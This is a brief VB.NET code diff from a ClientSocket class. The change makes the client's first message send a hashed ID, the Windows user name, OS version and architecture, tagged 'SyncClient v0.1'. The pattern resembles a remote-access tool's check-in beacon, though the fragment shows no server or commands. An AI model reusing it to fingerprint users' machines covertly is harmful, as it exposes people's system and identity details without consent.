@@ -44,7 +44,7 @@ Public Class ClientSocket
             MS = New MemoryStream
 
             Dim OS As New Devices.ComputerInfo
-            Send(String.Concat("INFO", SPL, "SYNC", SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
+            Send(String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "SyncClient v0.1"))
 
             Read()
 
